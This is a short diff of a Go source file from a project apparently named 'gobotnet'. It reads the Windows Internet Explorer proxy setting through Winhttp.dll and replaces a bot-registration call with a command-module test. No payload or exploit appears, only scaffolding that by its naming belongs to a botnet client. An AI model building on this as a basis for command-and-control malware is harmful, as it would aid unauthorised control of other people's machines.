@@ -2,6 +2,8 @@ package main
 
 import (
 	"fmt"
+	"gobotnet/command"
+	//"gobotnet/registration"
 	"net/url"
 	"os/exec"
 	"syscall"
@@ -9,8 +11,6 @@ import (
 	"unicode/utf16"
 	"unsafe"
 )
-
-import m_register "./register"
 
 var (
 	winhttpdll, _                            = syscall.LoadLibrary("Winhttp.dll")
@@ -83,6 +83,5 @@ func CStringToString(cs CString) (s string) {
 func main() {
 	fmt.Println(GetIEProxyFromWinHttp())
 	defer syscall.FreeLibrary(winhttpdll)
-	m_register.Register()
-
+	prgCmd.CmdTest()
 }
